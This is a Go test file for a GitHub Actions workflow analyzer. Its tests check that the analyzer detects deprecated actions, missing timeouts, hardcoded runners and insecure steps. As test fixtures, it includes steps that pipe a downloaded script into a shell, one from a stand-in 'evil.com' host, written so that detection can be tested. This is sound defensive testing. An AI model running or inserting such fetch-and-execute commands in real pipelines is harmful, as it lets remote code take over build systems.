package main

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/EdgarOrtegaRamirez/actionforge/internal/analyzer"
	"github.com/EdgarOrtegaRamirez/actionforge/internal/workflow"
)

func TestGoodWorkflowAnalysis(t *testing.T) {
	fixture := filepath.Join("fixtures", "good-workflow.yml")
	wf, err := parseFixture(fixture)
	if err != nil {
		t.Fatalf("failed to parse fixture: %v", err)
	}

	an := analyzer.NewAnalyzer()
	result := an.Analyze(wf)

	// Check basic metadata
	if result.Workflow.Name != "CI Pipeline" {
		t.Errorf("expected name 'CI Pipeline', got '%s'", result.Workflow.Name)
	}

	// Good workflow has some warnings (unpinned actions, no caching, etc.)
	if len(result.Issues) < 2 || len(result.Issues) > 12 {
		t.Errorf("good workflow should have 2-12 issues, got %d", len(result.Issues))
	}

	// Should have a decent score considering it has timeout-minutes and permissions
	if result.Score.Value < 30 {
		t.Errorf("good workflow should have score >= 30, got %d", result.Score.Value)
	}

	t.Logf("Good workflow: Score=%d/100 Grade=%s Issues=%d",
		result.Score.Value, result.Score.Grade, len(result.Issues))
}

func TestBadWorkflowAnalysis(t *testing.T) {
	fixture := filepath.Join("fixtures", "bad-workflow.yml")
	wf, err := parseFixture(fixture)
	if err != nil {
		t.Fatalf("failed to parse fixture: %v", err)
	}

	an := analyzer.NewAnalyzer()
	result := an.Analyze(wf)

	// Bad workflow should have many issues
	if len(result.Issues) < 5 {
		t.Errorf("bad workflow should have many issues, got %d", len(result.Issues))
	}

	// Should detect deprecated actions
	deprecatedFound := false
	for _, issue := range result.Issues {
		if issue.Title == "Deprecated action version" {
			deprecatedFound = true
			break
		}
	}
	if !deprecatedFound {
		t.Error("bad workflow should have deprecated action issues")
	}

	t.Logf("Bad workflow: Score=%d/100 Grade=%s Issues=%d",
		result.Score.Value, result.Score.Grade, len(result.Issues))
}

func TestTriggerDetection(t *testing.T) {
	fixture := filepath.Join("fixtures", "bad-workflow.yml")
	wf, err := parseFixture(fixture)
	if err != nil {
		t.Fatalf("failed to parse fixture: %v", err)
	}

	triggers := wf.GetTriggers()
	if len(triggers) != 3 {
		t.Errorf("expected 3 triggers (push, release, schedule), got %d: %v", len(triggers), triggers)
	}

	hasPush := false
	hasRelease := false
	hasSchedule := false
	for _, t := range triggers {
		switch t {
		case "push":
			hasPush = true
		case "release":
			hasRelease = true
		case "schedule":
			hasSchedule = true
		}
	}
	if !hasPush || !hasRelease || !hasSchedule {
		t.Errorf("missing triggers: push=%v release=%v schedule=%v", hasPush, hasRelease, hasSchedule)
	}
}

func TestActionPinning(t *testing.T) {
	// Test IsPinned
	if !workflow.IsPinned("actions/checkout@e2b06a2d56b61f0b1a9e9d2a2b0f8c9d4e5f6a7b") {
		t.Error("SHA-pinned action should be detected as pinned")
	}
	if workflow.IsPinned("actions/checkout@v4") {
		t.Error("tag-pinned action should not be detected as SHA-pinned")
	}
}

func TestActionRefParsing(t *testing.T) {
	tests := []struct {
		uses  string
		owner string
		name  string
		ref   string
	}{
		{"actions/checkout@v4", "actions", "checkout", "v4"},
		{"actions/checkout@e2b06a2d56b61f0b1a9e9d2a2b0f8c9d4e5f6a7b", "actions", "checkout", "e2b06a2d56b61f0b1a9e9d2a2b0f8c9d4e5f6a7b"},
		{"./local-action", "", "./local-action", ""},
		{"docker://alpine:latest", "", "docker://alpine:latest", ""},
	}

	for _, tt := range tests {
		owner, name, ref := workflow.GetActionRef(tt.uses)
		if owner != tt.owner {
			t.Errorf("GetActionRef(%q) owner = %q, want %q", tt.uses, owner, tt.owner)
		}
		if name != tt.name {
			t.Errorf("GetActionRef(%q) name = %q, want %q", tt.uses, name, tt.name)
		}
		if ref != tt.ref {
			t.Errorf("GetActionRef(%q) ref = %q, want %q", tt.uses, ref, tt.ref)
		}
	}
}

func TestWorkflowStatistics(t *testing.T) {
	fixture := filepath.Join("fixtures", "bad-workflow.yml")
	wf, err := parseFixture(fixture)
	if err != nil {
		t.Fatalf("failed to parse fixture: %v", err)
	}

	if wf.GetJobCount() != 2 {
		t.Errorf("expected 2 jobs, got %d", wf.GetJobCount())
	}

	actions := wf.GetAllActions()
	if len(actions) < 5 {
		t.Errorf("expected at least 5 actions, got %d: %v", len(actions), actions)
	}

	runners := wf.GetUniqueRunners()
	if len(runners) < 2 {
		t.Errorf("expected at least 2 runners, got %d", len(runners))
	}
}

func TestScalability(t *testing.T) {
	// Test with a minimal workflow to ensure fast analysis
	fixture := filepath.Join("fixtures", "good-workflow.yml")
	wf, err := parseFixture(fixture)
	if err != nil {
		t.Fatalf("failed to parse fixture: %v", err)
	}

	an := analyzer.NewAnalyzer()
	result := an.Analyze(wf)

	// Should produce a summary
	if result.Summary.JobCount < 1 {
		t.Error("expected at least 1 job in summary")
	}
	if result.Summary.StepCount < 1 {
		t.Error("expected at least 1 step in summary")
	}
}

func TestEmptyWorkflow(t *testing.T) {
	// Test parsing an empty workflow structure
	wf := &workflow.Workflow{
		Name: "Empty",
		Jobs: make(map[string]workflow.Job),
	}

	an := analyzer.NewAnalyzer()
	result := an.Analyze(wf)

	if result.Score.Value != 94 {
		t.Errorf("empty workflow should score 94, got %d", result.Score.Value)
		// Expected: 100 - 5 (no permissions) - 1 (no caching) = 94
	}
}

func TestScoreBoundaries(t *testing.T) {
	// Test that score doesn't go below 0
	an := analyzer.NewAnalyzer()
	wf := &workflow.Workflow{
		Name: "Terrible",
		Jobs: map[string]workflow.Job{
			"job1": {
				Steps: []workflow.Step{
					{Uses: "actions/checkout@v4"},
					{Run: "curl https://example.com/script.sh | sh"},
				},
			},
		},
	}

	result := an.Analyze(wf)
	if result.Score.Value < 0 {
		t.Errorf("score should not be negative, got %d", result.Score.Value)
	}
}

func TestSecurityDetection(t *testing.T) {
	wf := &workflow.Workflow{
		Name: "Security Test",
		On: workflow.Trigger{
			PullRequest: &workflow.EventTrigger{},
		},
		Jobs: map[string]workflow.Job{
			"build": {
				Steps: []workflow.Step{
					{Uses: "actions/checkout@v4"},
					{Run: `curl -sL https://evil.com/payload.sh | bash`},
				},
			},
		},
	}

	an := analyzer.NewAnalyzer()
	result := an.Analyze(wf)

	curlPipeFound := false
	for _, issue := range result.Issues {
		if issue.Title == "Piping curl to bash" {
			curlPipeFound = true
			break
		}
	}
	if !curlPipeFound {
		t.Error("expected 'Piping curl to bash' security issue")
	}
}

func TestRunnerVersionDetection(t *testing.T) {
	an := analyzer.NewAnalyzer()
	wf := &workflow.Workflow{
		Name: "Runner Test",
		Jobs: map[string]workflow.Job{
			"build": {
				RunsOn: []interface{}{"ubuntu-22.04"},
				Steps:  []workflow.Step{{Run: "echo hello"}},
			},
		},
	}

	result := an.Analyze(wf)

	hasHardcoded := false
	for _, issue := range result.Issues {
		if issue.Title == "Hardcoded runner version" {
			hasHardcoded = true
			break
		}
	}
	if !hasHardcoded {
		t.Error("expected hardcoded runner version warning")
	}
}

func TestMissingTimeout(t *testing.T) {
	an := analyzer.NewAnalyzer()
	wf := &workflow.Workflow{
		Name: "No Timeout",
		Jobs: map[string]workflow.Job{
			"build": {
				RunsOn: "ubuntu-latest",
				Steps:  []workflow.Step{{Run: "echo hello"}},
			},
		},
	}

	result := an.Analyze(wf)

	hasTimeoutIssue := false
	for _, issue := range result.Issues {
		if issue.Title == "Missing timeout-minutes" {
			hasTimeoutIssue = true
			break
		}
	}
	if !hasTimeoutIssue {
		t.Error("expected missing timeout warning")
	}
}

func TestJobDependencies(t *testing.T) {
	wf := &workflow.Workflow{
		Name: "Deps",
		Jobs: map[string]workflow.Job{
			"build": {
				Steps: []workflow.Step{{Run: "echo build"}},
			},
			"test": {
				Needs: "build",
				Steps: []workflow.Step{{Run: "echo test"}},
			},
		},
	}

	deps := wf.GetJobDependencies()
	if len(deps) != 2 {
		t.Errorf("expected 2 job dependencies, got %d", len(deps))
	}

	testDeps, ok := deps["test"]
	if !ok || len(testDeps) != 1 || testDeps[0] != "build" {
		t.Errorf("test should depend on build, got %v", testDeps)
	}
}

// Helper to parse a fixture file
func parseFixture(path string) (*workflow.Workflow, error) {
	parser := workflow.NewParser()
	return parser.ParseFile(path)
}

func TestMain(m *testing.M) {
	// Ensure we're in the tests directory for relative fixture paths
	if err := os.Chdir("tests"); err != nil {
		// Try without changing directory
		if _, err := os.Stat("fixtures/good-workflow.yml"); os.IsNotExist(err) {
			// Try from project root
			if _, err := os.Stat("tests/fixtures/good-workflow.yml"); err == nil {
				os.Chdir("tests")
			} else {
				// We're already in tests/ or somewhere else
			}
		}
	}
	os.Exit(m.Run())
}
